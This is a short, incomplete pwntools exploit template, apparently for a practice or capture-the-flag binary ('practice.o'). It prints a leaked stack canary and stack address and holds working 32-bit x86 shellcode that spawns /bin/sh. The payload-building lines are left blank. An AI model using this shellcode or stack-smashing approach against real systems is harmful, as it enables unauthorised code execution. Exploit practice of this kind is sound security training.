from pwn import *

r = process('practice.o')

canary = 

stack = 

print(hex(canary))
print(hex(stack))

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = 
ex += 
ex += 
ex += 

r.send(ex)

r.interactive()
